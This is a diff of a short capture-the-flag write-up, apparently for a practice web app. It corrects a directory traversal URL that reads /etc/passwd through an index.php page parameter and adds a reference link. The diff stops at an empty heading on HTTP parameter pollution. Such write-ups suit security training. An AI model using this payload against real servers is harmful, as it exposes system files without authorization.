@@ -1,6 +1,8 @@
 How to get the flag :
 
-Go to IP/index.php?page=?page=../../../../../../../etc/passwd
+https://www.acunetix.com/websitesecurity/directory-traversal/
+
+Go to IP/index.php?page=../../../../../../../etc/passwd
 
 
 How to solve HTTP parameter pollution :
